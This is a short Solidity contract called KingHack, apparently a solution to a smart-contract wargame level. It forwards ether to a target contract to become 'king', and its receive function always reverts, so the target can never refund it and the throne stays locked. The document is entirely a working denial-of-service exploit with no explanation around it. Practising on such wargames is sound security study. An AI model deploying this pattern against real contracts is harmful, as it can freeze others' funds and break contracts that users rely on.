// SPDX-License-Identifier: MIT LICENSE
pragma solidity ^0.8.7;

contract KingHack {
    function becomeKing(address payable _contractAddress) public payable{
        _contractAddress.call{value: msg.value}("");
    }

    receive() external payable {
        revert("I'm the king!");
    }
}
